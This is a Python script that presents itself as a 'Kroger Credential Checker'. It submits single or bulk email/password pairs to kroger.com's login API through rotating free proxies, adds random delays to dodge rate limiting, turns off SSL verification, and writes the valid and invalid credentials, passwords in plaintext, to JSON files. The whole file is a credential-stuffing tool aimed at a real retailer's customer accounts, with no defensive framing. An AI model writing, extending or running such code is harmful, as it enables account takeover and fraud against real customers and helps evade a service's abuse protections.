import requests
from fp.fp import FreeProxy
import random
import time
import json
import logging
import ssl
from typing import List, Dict
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self, use_proxy: bool = True):
        self.use_proxy = use_proxy
        self.proxy = None
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        self.valid_creds = []
        self.invalid_creds = []
        
        if self.use_proxy:
            self._rotate_proxy()
            
    def _rotate_proxy(self):
        """Get a fresh proxy from FreeProxy with retries"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                self.proxy = FreeProxy(rand=True, timeout=5).get()
                if self.proxy:
                    logger.info(f"Using proxy: {self.proxy}")
                    self.session.proxies = {
                        'http': self.proxy,
                        'https': self.proxy
                    }
                    # Test proxy connection
                    test_response = self.session.get('https://www.kroger.com', timeout=10)
                    if test_response.status_code == 200:
                        return
                    else:
                        logger.warning(f"Proxy test failed (status {test_response.status_code})")
            except Exception as e:
                logger.warning(f"Proxy attempt {attempt + 1} failed: {e}")
                time.sleep(1)
        
        logger.warning("All proxy attempts failed, continuing without proxy")
        self.proxy = None
        self.session.proxies = {}
            
    def _get_auth_token(self, email: str, password: str) -> str:
        """Attempt to get auth token from Kroger login"""
        try:
            # First get the login page to obtain CSRF tokens
            login_page = self.session.get(
                'https://www.kroger.com/signin',
                headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            )
            
            # Extract CSRF token
            csrf_token = self._extract_csrf(login_page.text)
            
            # Submit login request
            payload = {
                'email': email,
                'password': password,
                '_csrf': csrf_token
            }
            
            response = self.session.post(
                'https://www.kroger.com/auth/api/login',
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            )
            
            if response.status_code == 200:
                return response.json().get('token')
            return None
                
        except Exception as e:
            logger.error(f"Auth token error: {e}")
            return None
            
    def _extract_csrf(self, html: str) -> str:
        """Extract CSRF token from HTML"""
        if '_csrf":"' in html:
            return html.split('_csrf":"')[1].split('"')[0]
        return "dummy_csrf_token"
            
    def check_credentials(self, email: str, password: str) -> bool:
        """Check if credentials are valid using API requests"""
        logger.info(f"Checking: {email}:{password}")
        
        # Try to get auth token
        token = self._get_auth_token(email, password)
        if token:
            logger.info(f"VALID: {email}:{password}")
            return True
            
        logger.info(f"INVALID: {email}:{password}")
        return False
        
    def check_single(self, email: str, password: str):
        """Check a single credential pair"""
        is_valid = self.check_credentials(email, password)
        result = {
            'email': email,
            'password': password,
            'valid': is_valid,
            'proxy': self.proxy
        }
        
        if is_valid:
            self.valid_creds.append(result)
        else:
            self.invalid_creds.append(result)
            
        return result
        
    def check_bulk(self, credentials: List[Dict[str, str]]):
        """Check multiple credentials from a list"""
        results = []
        for cred in credentials:
            result = self.check_single(cred['email'], cred['password'])
            results.append(result)
            
            # Rotate proxy between requests if enabled
            if self.use_proxy and random.random() > 0.7:
                self._rotate_proxy()
                
            # Add delay to avoid rate limiting
            time.sleep(random.uniform(1, 3))
            
        return results
        
    def save_results(self):
        """Save results to JSON files"""
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            
        logger.info(f"Saved {len(self.valid_creds)} valid and {len(self.invalid_creds)} invalid credentials")
        
    def close(self):
        """Clean up resources"""
        self.session.close()

def main():
    print("Kroger Credential Checker (SSL Fixed Version)")
    print("1. Check single credential")
    print("2. Check bulk credentials from file")
    
    choice = input("Select option (1/2): ")
    
    checker = KrogerChecker(use_proxy=True)
    
    try:
        if choice == '1':
            email = input("Email: ")
            password = input("Password: ")
            result = checker.check_single(email, password)
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == '2':
            file_path = input("Enter credentials file path (JSON format): ")
            try:
                with open(file_path) as f:
                    credentials = json.load(f)
                    
                print(f"Checking {len(credentials)} credentials...")
                results = checker.check_bulk(credentials)
                
                print("\nSummary:")
                print(f"Valid: {len(checker.valid_creds)}")
                print(f"Invalid: {len(checker.invalid_creds)}")
                
                checker.save_results()
                
            except Exception as e:
                logger.error(f"Error loading credentials file: {e}")
                
        else:
            print("Invalid choice")
            
    finally:
        checker.close()

if __name__ == '__main__':
    main()
